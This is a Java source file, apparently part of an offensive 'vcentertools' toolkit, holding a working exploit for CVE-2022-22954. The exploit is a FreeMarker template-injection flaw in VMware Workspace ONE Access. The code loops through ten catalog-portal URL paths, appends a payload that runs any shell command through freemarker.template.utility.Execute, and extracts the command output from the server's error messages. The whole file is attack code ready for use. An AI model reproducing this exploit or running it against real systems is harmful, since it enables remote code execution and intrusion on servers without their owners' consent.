package com.example.vcentertools.model.exp;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Cve202222954 {

    public String command_22954(String targetUrl, String command){
        String[] payloads = {
                "/catalog-portal/ui?code=&deviceType=",
                "/catalog-portal/ui?code=&deviceUdid=",
                "/catalog-portal/hub-ui?deviceType=",
                "/catalog-portal/hub-ui?deviceUdid=",
                "/catalog-portal/hub-ui/byob?deviceType=",
                "/catalog-portal/hub-ui/byob?deviceUdid=",
                "/catalog-portal/ui/oauth/verify?error=&deviceType=",
                "/catalog-portal/ui/oauth/verify?error=&deviceUdid=",
                "/catalog-portal/ui/oauth/verify?code=&deviceType=",
                "/catalog-portal/ui/oauth/verify?code=&deviceUdid="
        };
        String poc = "${\"freemarker.template.utility.Execute\"?new()(\"" +command+"\")}";

        for (String payload : payloads) {
            String finalurl = targetUrl + payload + poc;
            try{
                HttpResponse response = HttpRequest.get(finalurl)
                        .execute();
                if (response.getStatus() == 400 && (response.body().contains("Authorization context is not valid") || response.body().contains("FreeMarker template error"))) {
                    String result = get_result(response.body());
                    return result;
                }
            }catch (Exception e){
                return " [-] 命令执行失败！";
            }
        }
        return " [-] 没有发现有效的执行路径！";
    }

    public String get_result(String response) {
        try {
            String result = null;

            Pattern pattern = Pattern.compile("device id: (.*?), device type");
            Matcher matcher = pattern.matcher(response);

            if (matcher.find()) {
                result = matcher.group(1);

                if ("null".equals(result)) {
                    if (response.contains("auth token")) {
                        pattern = Pattern.compile("device type: (.*?), auth token");
                    } else {
                        pattern = Pattern.compile("device type: (.*?)(and token revoke status|$)");
                    }

                    matcher = pattern.matcher(response);
                    if (matcher.find()) {
                        result = matcher.group(1);
                    }
                }

                result = result.replace("\\n", "\n").replace("\\t", "\t");
                return result;

            } else {
                return null;
            }

        } catch (Exception e) {
            return "结果获取错误：" + e.getMessage();
        }
    }
}
